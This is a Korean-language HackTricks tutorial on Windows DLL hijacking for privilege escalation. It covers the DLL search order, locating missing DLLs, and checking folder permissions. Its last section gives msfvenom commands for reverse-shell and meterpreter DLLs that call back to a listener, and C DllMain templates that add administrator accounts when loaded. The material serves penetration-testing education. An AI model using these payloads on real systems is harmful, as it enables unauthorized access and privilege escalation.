# Dll Hijacking

<details>

<summary><strong>htARTE (HackTricks AWS Red Team 전문가)</strong>를 통해 **제로부터 영웅까지 AWS 해킹 배우기**!</summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 PDF로 다운로드**하고 싶다면 [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com)를 구입하세요
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
* **Discord 그룹**에 **가입**하거나 [**텔레그램 그룹**](https://t.me/peass)에 가입하거나 **트위터**에서 **팔로우**하세요 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* 여러분의 해킹 기술을 공유하려면 [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) 깃허브 저장소에 PR을 제출하세요.

</details>

<figure><img src="../../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**버그 바운티 팁**: **해커들에 의해 만들어진 프리미엄 버그 바운티 플랫폼**인 **Intigriti**에 가입하세요! [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)에서 오늘 가입하고 최대 **$100,000**의 바운티를 받으세요!

{% embed url="https://go.intigriti.com/hacktricks" %}

## 기본 정보

DLL Hijacking은 신뢰할 수 있는 응용 프로그램을 조작하여 악성 DLL을 로드하도록 하는 것을 포함합니다. 이 용어는 **DLL 스푸핑, 인젝션 및 사이드로딩**과 같은 여러 전술을 포함합니다. 이는 주로 코드 실행, 지속성 달성 및 드물게 권한 상승을 위해 사용됩니다. 여기서는 권한 상승에 중점을 두었지만, 해킹 방법은 목표에 관계없이 일관되게 유지됩니다.

### 일반적인 기술

DLL Hijacking에는 응용 프로그램의 DLL 로딩 전략에 따라 효과가 달라지는 여러 가지 방법이 사용됩니다:

1. **DLL 교체**: 정품 DLL을 악성 DLL로 교체하고 필요에 따라 DLL 프록시를 사용하여 원래 DLL의 기능을 보존합니다.
2. **DLL 검색 순서 해킹**: 악성 DLL을 정품 DLL 앞에 검색 경로에 배치하여 응용 프로그램의 검색 패턴을 악용합니다.
3. **팬텀 DLL Hijacking**: 존재하지 않는 필요한 DLL로 응용 프로그램이 로드하도록 악성 DLL을 생성합니다.
4. **DLL 리다이렉션**: `%PATH%`나 `.exe.manifest` / `.exe.local` 파일과 같은 검색 매개변수를 수정하여 응용 프로그램을 악성 DLL로 이동시킵니다.
5. **WinSxS DLL 교체**: WinSxS 디렉토리에 정품 DLL을 악성 대응물로 대체하여 DLL 사이드로딩과 자주 관련된 방법입니다.
6. **상대 경로 DLL Hijacking**: 악성 DLL을 사용자가 제어하는 디렉토리에 복사된 응용 프로그램과 함께 배치하여 이진 프록시 실행 기술과 유사하게 보입니다.

## 누락된 Dlls 찾기

시스템 내에서 누락된 Dll을 찾는 가장 일반적인 방법은 [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)을 실행하고 다음 2개 필터를 **설정**하는 것입니다:

![](<../../../.gitbook/assets/image (311).png>)

![](<../../../.gitbook/assets/image (313).png>)

그리고 **파일 시스템 활동**을 표시하세요:

![](<../../../.gitbook/assets/image (314).png>)

**일반적인 dll을 찾는 경우** 몇 초 동안 이를 실행한 채로 두십시오.\
**특정 실행 파일 내에서 누락된 dll을 찾는 경우** "Process Name" "contains" "\<exec name>"과 같은 **다른 필터를 설정**하고 실행한 후 이벤트 캡처를 중지해야 합니다.

## 누락된 Dlls 악용

권한 상승을 위해 가장 좋은 기회는 **권한 있는 프로세스가 로드하려는 dll을 작성할 수 있는** 위치에 있어야 합니다. 따라서 우리는 **원래 dll보다 먼저 검색되는 위치**에 dll을 **작성**할 수 있을 것이며 (이상한 경우), 또는 **dll이 어떤 폴더에서도 존재하지 않는** 위치에 dll을 검색할 수 있는 폴더에 **작성**할 수 있을 것입니다.

### Dll 검색 순서

[**Microsoft 문서**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching)에서 Dll이 특정하게 로드되는 방법을 찾을 수 있습니다.

**Windows 응용 프로그램**은 특정 순서를 준수하여 일련의 **사전 정의된 검색 경로**를 따라 DLL을 찾습니다. DLL Hijacking 문제는 해로운 DLL이 이러한 디렉토리 중 하나에 전략적으로 배치되어 정품 DLL보다 먼저 로드되도록 보장할 때 발생합니다. 이를 방지하는 해결책은 응용 프로그램이 필요로 하는 DLL을 참조할 때 절대 경로를 사용하도록 하는 것입니다.

32비트 시스템에서 **DLL 검색 순서**는 다음과 같습니다:

1. 응용 프로그램이 로드된 디렉토리.
2. 시스템 디렉토리. 이 디렉토리의 경로를 얻으려면 [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) 함수를 사용하세요.(_C:\Windows\System32_)
3. 16비트 시스템 디렉토리. 이 디렉토리의 경로를 얻는 함수는 없지만 검색됩니다. (_C:\Windows\System_)
4. Windows 디렉토리. 이 디렉토리의 경로를 얻으려면 [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) 함수를 사용하세요. (_C:\Windows_)
5. 현재 디렉토리.
6. PATH 환경 변수에 나열된 디렉토리. 이는 **App Paths** 레지스트리 키로 지정된 응용 프로그램 경로를 포함하지 않습니다. **App Paths** 키는 DLL 검색 경로를 계산할 때 사용되지 않습니다.

이것은 **SafeDllSearchMode**가 활성화된 기본 검색 순서입니다. 비활성화하면 현재 디렉토리가 두 번째로 상승합니다. 이 기능을 비활성화하려면 **HKEY\_LOCAL\_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** 레지스트리 값을 만들고 0으로 설정하세요 (기본값은 활성화).

[**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) 함수가 **LOAD\_WITH\_ALTERED\_SEARCH\_PATH**로 호출되면 검색이 **LoadLibraryEx**가 로드하는 실행 모듈의 디렉토리에서 시작됩니다.

마지막으로 **dll이 이름 대신 절대 경로를 지정하여 로드될 수 있음**을 유의하세요. 이 경우 해당 dll은 **해당 경로에서만 검색**됩니다 (dll에 종속성이 있는 경우 이름으로만 로드됩니다).

검색 순서를 변경하는 다른 방법도 있지만 여기서는 설명하지 않겠습니다.

#### Windows 문서의 DLL 검색 순서 예외 사항

Windows 문서에는 표준 DLL 검색 순서에 대한 특정 예외 사항이 기재되어 있습니다:

* **메모리에 이미 로드된 DLL과 동일한 이름을 가진 DLL**을 만나면, 시스템은 일반적인 검색을 우회합니다. 대신, 리다이렉션 및 매니페스트를 확인한 후 메모리에 이미 있는 DLL로 기본 설정됩니다. **이 시나리오에서 시스템은 DLL에 대한 검색을 수행하지 않습니다**.
* DLL이 현재 Windows 버전에 대해 **알려진 DLL**로 인식되는 경우, 시스템은 해당 알려진 DLL 버전을 사용하며, **검색 프로세스를 건너뛰고** 해당 알려진 DLL의 종속 DLL 중 하나를 사용합니다. 레지스트리 키 **HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs**에는 이러한 알려진 DLL 목록이 포함됩니다.
* **DLL에 종속성이 있는 경우**, 해당 종속 DLL의 검색은 **모듈 이름**으로만 표시된 것처럼 수행됩니다. 초기 DLL이 전체 경로를 통해 식별되었는지 여부에 관계없이 이러한 종속 DLL의 검색이 수행됩니다.

### 권한 상승

**요구 사항**:

* **다른 권한으로 작동하거나 작동할 프로세스**를 식별합니다(수평 또는 수직 이동), **DLL이 없는** 상태여야 합니다.
* **DLL이 검색될 디렉토리**에 **쓰기 액세스**가 가능한지 확인합니다. 이 위치는 실행 파일의 디렉토리이거나 시스템 경로 내의 디렉토리일 수 있습니다.

네, 요구 사항을 찾는 것은 복잡합니다. **기본적으로 권한이 있는 실행 파일이 DLL이 없는 것을 찾는 것은 조금 이상하며**, **시스템 경로 폴더에 쓰기 권한이 있는 것은 더 이상하다** (기본적으로 불가능합니다). 그러나, 잘못 구성된 환경에서는 가능합니다.\
요구 사항을 충족하는 경우 [UACME](https://github.com/hfiref0x/UACME) 프로젝트를 확인할 수 있습니다. **프로젝트의 주요 목표가 UAC 우회인** 경우도 있지만, **Windows 버전에 대한 Dll hijaking의 PoC**를 찾을 수 있습니다(아마도 쓰기 권한이 있는 폴더의 경로를 변경하는 것만으로 사용할 수 있습니다).

폴더의 권한을 확인하려면 다음을 수행할 수 있습니다:

```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```

그리고 **PATH 내의 모든 폴더의 권한을 확인하십시오**:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

당신은 실행 파일의 가져오기(import)와 DLL의 내보내기(export)도 확인할 수 있습니다:

```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```

**Dll Hijacking을 악용하여 권한 상승**을 하는 전체 가이드를 보려면 **시스템 경로 폴더에 쓰기 권한**이 있는지 확인하십시오:

{% content-ref url="writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

### 자동화 도구

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)는 시스템 경로 내의 어떤 폴더에 쓰기 권한이 있는지 확인합니다.\
이 취약점을 발견하는 데 유용한 다른 자동화 도구로는 **PowerSploit 함수**가 있습니다: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_, _Write-HijackDll_.

### 예시

취약한 시나리오를 발견한 경우 성공적으로 악용하기 위한 가장 중요한 것 중 하나는 **실행 파일이 가져올 모든 함수를 적어도 내보내는 dll을 생성하는 것**입니다. 그러나 Dll Hijacking은 중간 통합 수준에서 높은 수준으로 [**(UAC 우회)**](../../authentication-credentials-uac-and-efs/#uac) 또는 [**높은 수준에서 SYSTEM으로**](../#from-high-integrity-to-system)\*\* 이동하는 데 유용합니다.\*\* 유효한 dll을 생성하는 방법에 대한 예시는 다음 dll hijacking에 중점을 둔 연구에서 찾을 수 있습니다: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
또한 **다음 섹션**에서는 **유용한 기본 dll 코드**를 찾을 수 있으며 **템플릿으로 사용하거나 필요하지 않은 함수가 내보내진 dll을 생성하는 데 유용**할 수 있습니다.

## **Dll 생성 및 컴파일**

### **Dll 프록시팅**

기본적으로 **Dll 프록시**는 **로드될 때 악의적인 코드를 실행**할 수 있지만 실제 라이브러리로의 모든 호출을 **중계하여 노출하고 작동**할 수 있는 Dll입니다.

[**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) 또는 [**Spartacus**](https://github.com/Accenture/Spartacus)를 사용하여 **실행 파일을 지정하고 프록시화할 라이브러리를 선택**하고 **프록시화된 dll을 생성**하거나 **Dll을 지정**하고 **프록시화된 dll을 생성**할 수 있습니다.

### **Meterpreter**

**rev 쉘 가져오기 (x64):**

```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**미터프리터(x86) 얻기:**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**사용자 생성 (x86 버전만 보였습니다. x64 버전은 보이지 않았습니다):**

```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```

### 당신만의

여러 경우에는 컴파일하는 Dll이 희생자 프로세스에서 로드될 함수를 **여러 개 내보내야** 합니다. 이러한 함수가 없으면 **바이너리가 로드할 수 없으며** **공격이 실패**합니다.

```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```

## 참고 자료

* [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
* [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)

<figure><img src="../../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**버그 바운티 팁**: **Intigriti**에 **가입**하여 해커들이 만든 프리미엄 **버그 바운티 플랫폼**에 참여하세요! [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)에서 오늘 가입하고 최대 **$100,000**의 바운티를 받아보세요!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 **제로부터 히어로까지 AWS 해킹 배우기**!</summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 PDF로 다운로드하려면** [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com)를 구매하세요
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
* 💬 [**디스코드 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **가입**하거나 **트위터** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**를 팔로우**하세요.
* **HackTricks** 및 **HackTricks Cloud** 깃허브 저장소에 PR을 제출하여 **해킹 트릭을 공유**하세요.

</details>
